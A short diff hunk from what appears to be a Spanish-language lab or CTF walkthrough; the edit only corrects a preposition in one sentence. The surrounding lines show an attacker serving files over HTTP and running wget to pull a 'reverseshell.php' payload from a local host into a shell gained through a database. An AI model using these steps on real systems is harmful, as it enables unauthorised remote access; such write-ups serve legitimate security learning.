@@ -128,7 +128,7 @@ python3 -m http.server 80
 ```
 ![20](https://user-images.githubusercontent.com/75953873/182731305-a8adc335-e819-4e5c-9f1e-c388f900f595.png)
 
-Descargar la reverse shell desde la shell obtenida de la base de datos:
+Descargar la reverse shell desde la shell obtenida en la base de datos:
 ```
 wget http://192.168.1.9/reverseshell.php
 ```
